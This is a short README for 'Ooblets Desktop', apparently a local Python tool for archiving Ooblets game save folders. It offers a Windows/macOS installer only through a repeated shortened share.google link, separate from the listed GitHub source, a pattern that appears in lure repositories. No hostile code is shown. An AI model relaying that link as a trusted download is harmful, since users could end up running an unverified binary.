![Ooblets Desktop](assets/hero.png)

# Ooblets Desktop

*Keep the town on disk before a season fest.*

## About

**Ooblets Desktop** runs on your own PC. A local helper for Ooblets town folders, ooblet barns, and dance photos.

Ooblets folders sit next to dance caches.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Finds the Ooblets user folder.
- Archives town and barn files.
- Lists dance photo albums.
- Prints a short keep report.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/payt-johnson17/ooblets-desktop

MIT license. See `LICENSE`.
